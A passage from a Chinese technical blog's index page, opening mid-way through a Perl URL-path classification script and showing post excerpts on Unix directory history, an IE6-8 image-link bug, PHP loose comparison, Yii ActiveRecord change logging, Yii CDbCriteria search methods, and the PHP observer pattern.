			$patternarray2\[$totalarea2\] &#x3D; 1; #数字pattern
		&#125;
		elsif( $tmp2\[$j\] &#x3D;~ &#x2F;^\[a-zA-Z\]+$&#x2F;)
		&#123;
			$patternarray2\[$totalarea2\] &#x3D; 2; #纯字母pattern
		&#125;
		elsif( $tmp2\[$j\] &#x3D;~ &#x2F;^\[a-zA-Z\]+\[0-9\]+$&#x2F;)
		&#123;
			$patternarray2\[$totalarea2\] &#x3D; 3; #先字母后数字pattern
		&#125;
		elsif( $tmp2\[$j\] &#x3D;~ &#x2F;^\[0-9\]+\[a-zA-Z\]+$&#x2F;)
		&#123;
			$patternarray2\[$totalarea2\] &#x3D; 4; #先数字后字母pattern
		&#125;
		else
		&#123;
			$patternarray2\[$totalarea2\] &#x3D; 5; #其他pattern
		&#125;
		if( $j &#x3D;&#x3D; 0 )
		&#123;
			$splitarray2\[$totalarea2\]&#x3D;1;
		&#125;
		else
		&#123;
			$splitarray2\[$totalarea2\]&#x3D;2;
		&#125;
		$totalarea2 ++;
	&#125;
&#125;
print $path1,&quot; &quot;,$lastispath1,&quot; &quot;,$hassuffix1,&quot; &quot;,$issuffixsame,&quot; &quot;,$totalarea1;
for( $i &#x3D; 0; $i&lt;$totalarea1; $i++)
&#123;
	print &quot; &quot;,$splitarray1\[$i\],&quot; &quot;,$patternarray1\[$i\];
&#125;
print &quot;\\n&quot;;
print $path2,&quot; &quot;,$lastispath2,&quot; &quot;,$hassuffix1,&quot; &quot;,$issuffixsame,&quot; &quot;,$totalarea2;
for( $i &#x3D; 0; $i&lt;$totalarea2; $i++)
&#123;
	print &quot; &quot;,$splitarray2\[$i\],&quot; &quot;,$patternarray2\[$i\];
&#125;
print &quot;\\n&quot;;
#print @array1;</code></pre>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/posts/the-origin-of-the-Unix-directory-structure/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/avatar.jpg">
      <meta itemprop="name" content="Veitor">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Veitor的技术博客">
      <meta itemprop="description" content="关注互联网技术，对Java、Golang、Kubernetes、AI应用、云原生架构等感兴趣">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | Veitor的技术博客">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/the-origin-of-the-Unix-directory-structure/" class="post-title-link" itemprop="url">Unix目录结构的来历</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2014-07-15 00:53:10" itemprop="dateCreated datePublished" datetime="2014-07-15T00:53:10+08:00">2014-07-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-12-03 16:44:15" itemprop="dateModified" datetime="2025-12-03T16:44:15+08:00">2025-12-03</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/" itemprop="url" rel="index"><span itemprop="name">计算机系统</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>Unix（包含Linux）的初学者，常常会很困惑，不明白目录结构的含义何在。 <a target="_blank" rel="noopener" href="http://storage.veitor.net/uploads/2014/07/bg2012020601.jpg"><img data-src="http://storage.veitor.net/uploads/2014/07/bg2012020601.jpg" alt="bg2012020601"></a> 举例来说，根目录下面有一个子目录&#x2F;bin，用于存放二进制程序。但是，&#x2F;usr子目录下面还有&#x2F;usr&#x2F;bin，以及&#x2F;usr&#x2F;local&#x2F;bin，也用于存放二进制程序；某些系统甚至还有&#x2F;opt&#x2F;bin。它们有何区别？ 长久以来，我也感到很费解，不明白为什么这样设计。像大多数人一样，我只是根据<a target="_blank" rel="noopener" href="http://www.pathname.com/fhs/pub/fhs-2.3.html">《Unix文件系统结构标准》</a>（Filesystem Hierarchy Standard），死记硬背不同目录的区别。 昨天，我读到了Rob Landley的<a target="_blank" rel="noopener" href="http://lists.busybox.net/pipermail/busybox/2010-December/074114.html">简短解释</a>，这才恍然大悟，原来Unix目录结构是历史造成的。 话说1969年，<a target="_blank" rel="noopener" href="http://www.ruanyifeng.com/blog/2009/06/unix_turns_40.html">Ken Thompson</a>和<a target="_blank" rel="noopener" href="http://www.ruanyifeng.com/blog/2011/10/dennis_ritchie.html">Dennis Ritchie</a>在小型机PDP-7上发明了Unix。1971年，他们将主机升级到了PDP-11。 <a target="_blank" rel="noopener" href="http://storage.veitor.net/uploads/2014/07/bg2012020602.jpg"><img data-src="http://storage.veitor.net/uploads/2014/07/bg2012020602.jpg" alt="bg2012020602"></a>当时，他们使用一种叫做RK05的储存盘，一盘的容量大约是1.5MB。 <a target="_blank" rel="noopener" href="http://storage.veitor.net/uploads/2014/07/bg2012020603.jpg"><img data-src="http://storage.veitor.net/uploads/2014/07/bg2012020603.jpg" alt="bg2012020603"></a> 没过多久，操作系统（根目录）变得越来越大，一块盘已经装不下了。于是，他们加上了第二盘RK05，并且规定第一块盘专门放系统程序，第二块盘专门 放用户自己的程序，因此挂载的目录点取名为&#x2F;usr。也就是说，根目录”&#x2F;“挂载在第一块盘，”&#x2F;usr”目录挂载在第二块盘。除此之外，两块盘的目录结 构完全相同，第一块盘的目录（&#x2F;bin, &#x2F;sbin, &#x2F;lib, &#x2F;tmp…）都在&#x2F;usr目录下重新出现一次。 后来，第二块盘也满了，他们只好又加了第三盘RK05，挂载的目录点取名为&#x2F;home，并且规定&#x2F;usr用于存放用户的程序，&#x2F;home用于存放用户的数据。 从此，这种目录结构就延续了下来。随着硬盘容量越来越大，各个目录的含义进一步得到明确。 **&#x2F;**：存放系统程序，也就是At&amp;t开发的Unix程序。 <strong>&#x2F;usr</strong>：存放Unix系统商（比如IBM和HP）开发的程序。 <strong>&#x2F;usr&#x2F;local</strong>：存放用户自己安装的程序。 <strong>&#x2F;opt</strong>：在某些系统，用于存放第三方厂商开发的程序，所以取名为option，意为”选装”。 （完）</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/posts/problem-of-link-pictures-under-IE678/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/avatar.jpg">
      <meta itemprop="name" content="Veitor">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Veitor的技术博客">
      <meta itemprop="description" content="关注互联网技术，对Java、Golang、Kubernetes、AI应用、云原生架构等感兴趣">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | Veitor的技术博客">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/problem-of-link-pictures-under-IE678/" class="post-title-link" itemprop="url">IE678下链接图片点不中问题讨论</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2014-06-26 07:01:17" itemprop="dateCreated datePublished" datetime="2014-06-26T07:01:17+08:00">2014-06-26</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-12-03 16:44:15" itemprop="dateModified" datetime="2025-12-03T16:44:15+08:00">2025-12-03</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/JS/" itemprop="url" rel="index"><span itemprop="name">JS</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p><a target="_blank" rel="noopener" href="http://storage.veitor.net/uploads/2014/06/QQ%E6%88%AA%E5%9B%BE20140626150002.jpg"><img data-src="http://storage.veitor.net/uploads/2014/06/QQ%E6%88%AA%E5%9B%BE20140626150002.jpg" alt="QQ截图20140626150002"></a>因为今天制作的房产项目中出现了图片链接无法点击问题，重新审视了一下块集元素和内联元素，不是混淆，而是重新想了一下新的东西，有时候在我们进行重构的时候，偶尔会为了实际需要而将内联元素强制显示为块集元素，在一般情况下，这个是不会出问题的，而且可以很轻松的通过标准，但是在某一些情况下，虽然验证工具可以放过我们，但是在ie678下面会出现解析不正确的问题，下面就简单跟大家分享一下这个问题。 有时候由于需要文字和图片同时获取到点击态，或者需要实现一些高难度的效果，就需要多标签来写结构，可能的结构会如下所示： <div class="block"> <a target="_blank" rel="noopener" href="http://www.hualongxiang.com"><span><img data-src="http://static.hualongxiang.com/logo/logo.jpg" alt="hlx" /></span></a> </div> 在没有被赋予强大的CSS的时候，是可以正常点击的，但是当赋予需要的CSS的时候，在ie8一下就会出现图片区域点击不到的情况： .block span{float:left;} 如果将span标签块集化： .block span{float:left;dispaly:block;width:100px;height:100px;} 最终的结果依然不是不能点击到，但是图片区域以为的内容确可以正常点击。 而对于此，我的理解是这样的： 因为a标签本身就是一个内联元素标签，内联标签内正常情况只允许放置内联元素，放置块集元素本身语法就有问题，虽然表面上放置的span标签，但是我们又将其强制块集化，在某些浏览器下还是会解析错误，比如说ie6&#x2F;7，所以这里针对链接的这种情况，出现的问题就是图片区域无法点击。 针对这种问题的解决方法： 保证在a标签中不要放置块集元素，或者强制块集元素，如果需要解决一些特殊效果，可以采取将这个强制元素跟a内置的img标签同级放置，这样也可以避免图片点击不到问题。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/posts/using-double-equals-with-caution-in-PHP/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/avatar.jpg">
      <meta itemprop="name" content="Veitor">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Veitor的技术博客">
      <meta itemprop="description" content="关注互联网技术，对Java、Golang、Kubernetes、AI应用、云原生架构等感兴趣">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | Veitor的技术博客">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/using-double-equals-with-caution-in-PHP/" class="post-title-link" itemprop="url">PHP中慎用双等于(==)</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2014-06-24 09:09:37" itemprop="dateCreated datePublished" datetime="2014-06-24T09:09:37+08:00">2014-06-24</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-12-03 16:44:15" itemprop="dateModified" datetime="2025-12-03T16:44:15+08:00">2025-12-03</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/PHP/" itemprop="url" rel="index"><span itemprop="name">PHP</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>PHP比较运算符出现的频率实在是太高了，尤其是 <code>==</code>、 <code>if(a == b)&#123; // do something &#125;</code></p>
<p>但是，你真的掌握了 <code>==</code> 了吗？细节很重要！ 来看下面的代码，说出你认为正确的答案 </p>
<pre class="line-numbers language-none"><code class="language-none">var_dump(&#39;123fg456&#39;&#x3D;&#x3D;123);
var_dump(&#39;some string&#39; &#x3D;&#x3D; 0);
var_dump(123.0 &#x3D;&#x3D; &#39;123d456&#39;);
var_dump(0 &#x3D;&#x3D; &quot;a&quot;);
var_dump(&quot;1&quot; &#x3D;&#x3D; &quot;01&quot;);
var_dump(&quot;1&quot; &#x3D;&#x3D; &quot;1e0&quot;);</code></pre>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/posts/using-double-equals-with-caution-in-PHP/#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/posts/log-mechanism-in-Yii1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/avatar.jpg">
      <meta itemprop="name" content="Veitor">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Veitor的技术博客">
      <meta itemprop="description" content="关注互联网技术，对Java、Golang、Kubernetes、AI应用、云原生架构等感兴趣">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | Veitor的技术博客">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/log-mechanism-in-Yii1/" class="post-title-link" itemprop="url">了解Yii中Log日志机制</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2014-05-27 05:38:20" itemprop="dateCreated datePublished" datetime="2014-05-27T05:38:20+08:00">2014-05-27</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-12-03 16:44:15" itemprop="dateModified" datetime="2025-12-03T16:44:15+08:00">2025-12-03</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/PHP/" itemprop="url" rel="index"><span itemprop="name">PHP</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>想要知道用户在你的程序中做了些什么，我们可以通过用日志的形式记录下来，前提是用户是做的跟数据库有关的操作。我们可以在任何时候进行的增删改操作都可以记录下来，对于Yii中的AR模型我们可以使用behavior（行为）来达到此目的，这样很容易的就可以把日志功能加到AR类里。 首先我们需要建一张日志表：</p>
<p>CREATE TABLE ActiveRecordLog (<br>  id INTEGER UNSIGNED NOT NULL AUTO_INCREMENT,<br>  description VARCHAR(255) NULL,<br>  action VARCHAR(20) NULL,<br>  model VARCHAR(45) NULL,<br>  idModel INTEGER UNSIGNED NULL,<br>  field VARCHAR(45) NULL,<br>  creationdate TIMESTAMP NOT NULL,<br>  userid VARCHAR(45) NULL,<br>  PRIMARY KEY(id)<br>)<br>TYPE&#x3D;InnoDB;</p>
<p>接着我们就需要建立相应的model，可以使用gii或者shell工具等。 为了记录用户操作，我们需要创建一个behavior类，一般放在protected&#x2F;behavior目录下，该类必须继承CActiveRecordBehavior类。</p>
<p>class ActiveRecordLogableBehavior extends CActiveRecordBehavior<br>{<br>    private $_oldattributes &#x3D; array();<br>    &#x2F;**<br>     * save操作<br>     * @param  [type] $event [description]<br>     * @return [type]        [description]<br>     *&#x2F;<br>    public function afterSave($event)<br>    {<br>        &#x2F;&#x2F;非新记录，即非插入<br>        if (!$this-&gt;Owner-&gt;isNewRecord) {<br>            $newattributes &#x3D; $this-&gt;Owner-&gt;getAttributes();             &#x2F;&#x2F;获得AR类中已修改的各字段值<br>            $oldattributes &#x3D; $this-&gt;getOldAttributes();                 &#x2F;&#x2F;之前的旧数据<br>            &#x2F;&#x2F;比较新旧数据<br>            foreach ($newattributes as $name &#x3D;&gt; $value) {<br>                if (!empty($oldattributes)) {<br>                    $old &#x3D; $oldattributes[$name];<br>                } else {<br>                    $old &#x3D; ‘’;<br>                }<br>                &#x2F;&#x2F;如果该字段旧数据与新数据不一样，则进行记录<br>                if ($value !&#x3D; $old) {<br>                    &#x2F;&#x2F;$changes &#x3D; $name . ‘ (‘.$old.’) &#x3D;&gt; (‘.$value.’), ‘;<br>                    $log&#x3D;new ActiveRecordLog;                                               &#x2F;&#x2F;实例log对象<br>                    $log-&gt;description&#x3D;  ‘User ‘ . Yii::app()-&gt;user-&gt;Name                    &#x2F;&#x2F;设置日志内容格式，描述具体操作<br>                                            . ‘ changed ‘ . $name . ‘ for ‘<br>                                            . get_class($this-&gt;Owner)<br>                                            . ‘[‘ . $this-&gt;Owner-&gt;getPrimaryKey() .’].’;<br>                    $log-&gt;action&#x3D;       ‘CHANGE’;                                           &#x2F;&#x2F;设置操作类型为“修改”<br>                    $log-&gt;model&#x3D;        get_class($this-&gt;Owner);<br>                    $log-&gt;idModel&#x3D;      $this-&gt;Owner-&gt;getPrimaryKey();                      &#x2F;&#x2F;获得修改的记录的主键<br>                    $log-&gt;field&#x3D;        $name;                                              &#x2F;&#x2F;修改的字段名<br>                    $log-&gt;creationdate&#x3D; new CDbExpression(‘NOW()’);                         &#x2F;&#x2F;日志生成时间<br>                    $log-&gt;userid&#x3D;       Yii::app()-&gt;user-&gt;id;                               &#x2F;&#x2F;记录用户id<br>                    $log-&gt;save();                                                           &#x2F;&#x2F;保存日至到数据库<br>                }<br>            }<br>        } else {&#x2F;&#x2F;新纪录直接保存操作日志入库<br>            $log&#x3D;new ActiveRecordLog;<br>            $log-&gt;description&#x3D;  ‘User ‘ . Yii::app()-&gt;user-&gt;Name<br>                                    . ‘ created ‘ . get_class($this-&gt;Owner)<br>                                    . ‘[‘ . $this-&gt;Owner-&gt;getPrimaryKey() .’].’;<br>            $log-&gt;action&#x3D;       ‘CREATE’;<br>            $log-&gt;model&#x3D;        get_class($this-&gt;Owner);<br>            $log-&gt;idModel&#x3D;      $this-&gt;Owner-&gt;getPrimaryKey();<br>            $log-&gt;field&#x3D;        ‘’;<br>            $log-&gt;creationdate&#x3D; new CDbExpression(‘NOW()’);<br>            $log-&gt;userid&#x3D;       Yii::app()-&gt;user-&gt;id;<br>            $log-&gt;save();<br>        }<br>    }<br>    &#x2F;**<br>     * 删除操作<br>     * @param  [type] $event [description]<br>     * @return [type]        [description]<br>     *&#x2F;<br>    public function afterDelete($event)<br>    {<br>        $log&#x3D;new ActiveRecordLog;<br>        $log-&gt;description&#x3D;  ‘User ‘ . Yii::app()-&gt;user-&gt;Name . ‘ deleted ‘<br>                                . get_class($this-&gt;Owner)<br>                                . ‘[‘ . $this-&gt;Owner-&gt;getPrimaryKey() .’].’;<br>        $log-&gt;action&#x3D;       ‘DELETE’;<br>        $log-&gt;model&#x3D;        get_class($this-&gt;Owner);<br>        $log-&gt;idModel&#x3D;      $this-&gt;Owner-&gt;getPrimaryKey();<br>        $log-&gt;field&#x3D;        ‘’;<br>        $log-&gt;creationdate&#x3D; new CDbExpression(‘NOW()’);<br>        $log-&gt;userid&#x3D;       Yii::app()-&gt;user-&gt;id;<br>        $log-&gt;save();<br>    }<br>    public function afterFind($event)<br>    {<br>        &#x2F;&#x2F;保存查询出来的数据<br>        $this-&gt;setOldAttributes($this-&gt;Owner-&gt;getAttributes());<br>    }<br>    public function getOldAttributes()<br>    {<br>        return $this-&gt;_oldattributes;<br>    }<br>    public function setOldAttributes($value)<br>    {<br>        $this-&gt;_oldattributes&#x3D;$value;<br>    }<br>}</p>
<p>该behavior行为类中需要使用到ActiveRecordLo类来将日志记录到数据库中，它会为为每次插入、删除记录一条日志，也会为修改的每个字段记录一条日志。 设定的行为已经写好了，那么剩下的就是需要将其绑定到对应的model模型上。我们只需在对应的model里加入以下方法就完成绑定了：</p>
<p>public function behaviors()<br>{<br>    return array(<br>        &#x2F;&#x2F; 行为类名 &#x3D;&gt; 类文件别名路径<br>        ‘ActiveRecordLogableBehavior’&#x3D;&gt;<br>            ‘application.behaviors.ActiveRecordLogableBehavior’,<br>    );<br>}</p>
<p>  当然这些都是最基本的简单的记录日志操作，你还可以进行扩展，以满足更高级更多功能的需求。如有问题，留言探讨~</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/posts/the-difference-between-addSearchCondition-and-compare-in-Yii/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/avatar.jpg">
      <meta itemprop="name" content="Veitor">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Veitor的技术博客">
      <meta itemprop="description" content="关注互联网技术，对Java、Golang、Kubernetes、AI应用、云原生架构等感兴趣">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | Veitor的技术博客">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/the-difference-between-addSearchCondition-and-compare-in-Yii/" class="post-title-link" itemprop="url">Yii的CDbCriteria中addSearchCondition与compare的区别</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2014-05-22 03:36:27" itemprop="dateCreated datePublished" datetime="2014-05-22T03:36:27+08:00">2014-05-22</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-12-03 16:44:15" itemprop="dateModified" datetime="2025-12-03T16:44:15+08:00">2025-12-03</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/PHP/" itemprop="url" rel="index"><span itemprop="name">PHP</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>在使用Yii过程中发现CDbCriteria类中addSearchCondition与compare的功能似乎都是用于增加搜索条件的，但仔细看其代码之后还是有区别的。 这里我就讲一下使用方法吧，不讲原理了，讲原理要分析其代码涉及很多。</p>
<h1 id="addSearchCondition第一个参数为搜索的字段名"><a href="#addSearchCondition第一个参数为搜索的字段名" class="headerlink" title="addSearchCondition第一个参数为搜索的字段名"></a>addSearchCondition第一个参数为搜索的字段名</h1><p>第二个参数为搜索关键词 第三个参数是设置是否过滤掉你关键词中的“%”百分号和”_“下划线这两个通配符，默认是true，即过滤这两个通配符，并在关键词前后自动加上”%”以进行匹配。第四个参数就是条件连接符，默认为AND，最后一个是Sql 关键字”LIKE”，还可以设置为“NOT LIKE”。基本上最后两个参数都不需要自己设置，都使用默认值就好了。 <strong>addSearchCondition就大致理解为增加一个LIKE搜索条件即可。</strong></p>
<h1 id="compare"><a href="#compare" class="headerlink" title="compare"></a>compare</h1><p>第一个参数一样为搜索的字段名 第二个参数也是关键词，但不同点也在于此，你可以在关键词开头加”&lt;”、”&gt;”、”&lt;&#x3D;”、”&gt;&#x3D;”、”&lt;&gt;”这四个比较符号，组成的sql语句就类似[字段名][比较符号][搜索关键词]，如我搜一个商品价格小于5的东西就这么写：compare(‘price’,’&lt;5’)，查询相当于这样”price &lt; 5”，它会自动提取开头的比较符号，如果你没写比较符号，那默认的就是”&#x3D;”等于符号，写成这样compare(‘price’,’5’)就相当于’price&#x3D;5’这种效果。 第三个参数是开启模糊匹配，默认是false关闭的，开启后，会调用上面的addSearchCondition方法，也就又使用了LIKE。compare(‘price’,’5’,true)即price LIKE %5%，compare(‘price’,’&lt;&gt;5’,true)即price NOT LIKE %5%，如果使用其他比较符号如compare(‘price’,’&lt;&#x3D;5’,true)、compare(‘price’,’&gt;5’,true)等，使不会增加addSearchCondition的。 第四个参数是条件连接符AND，当然可以设置为其他的。 第五个参数是设置addSearchCondition中第三个条件的，当然你前面的参数要确保能调用addSearchCondition这个方法。 <strong>compare可以这么理解，相当于使用”&lt;”、”&gt;”、”&lt;&#x3D;”、”&gt;&#x3D;”、”&lt;&gt;”来比较值，启用模糊匹配就使用LIKE方式。</strong>   差不多就是这些吧，如果还有不明白的可以提出，我再讲细一点。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/posts/observer-mode/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/avatar.jpg">
      <meta itemprop="name" content="Veitor">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Veitor的技术博客">
      <meta itemprop="description" content="关注互联网技术，对Java、Golang、Kubernetes、AI应用、云原生架构等感兴趣">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | Veitor的技术博客">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/observer-mode/" class="post-title-link" itemprop="url">了解PHP设计模式之观察者模式</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2014-05-11 04:22:54" itemprop="dateCreated datePublished" datetime="2014-05-11T04:22:54+08:00">2014-05-11</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-12-03 16:44:15" itemprop="dateModified" datetime="2025-12-03T16:44:15+08:00">2025-12-03</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/PHP/" itemprop="url" rel="index"><span itemprop="name">PHP</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/PHP/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/" itemprop="url" rel="index"><span itemprop="name">设计模式</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>观察者模式是一种事件系统，意味着这一模式允许某个类观察另一个类的状态，当被观察的类状态发生改变的时候，观察类可以收到通知并且做出相应的动作，观察者模式提供了避免组件之间紧密耦合的另一种方式。</p>
<p>在观察者模式中，被观察者称为subject,观察者称为observer,为了表达这些内容，SPL（Standard PHP Libaray）提供了SplSubject(被观察者)和SplObserver(观察者)两个接口。在编写观察者模式时，只要实现这两个接口即可。接口如下：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"> &#x2F;&#x2F;被观察者接口
interface SplSubject&#123;
   public function attach(SplObserver $observer);&#x2F;&#x2F;注册观察者（注册的观察者：当我（被观察者）的某个状态改变时，需要通知的对象）
   public function detach(SplObserver $observer);&#x2F;&#x2F;释放观察者
   public function notify();&#x2F;&#x2F;通知所有注册的观察者的方法
&#125;
  &#x2F;&#x2F;观察者接口
  interface SplObserver&#123;
   public function update(SplSubject $subject);&#x2F;&#x2F;观察者进行更新状态
  &#125;</code></pre>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/posts/observer-mode/#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/posts/crypt-encryption-functions-in-PHP/">

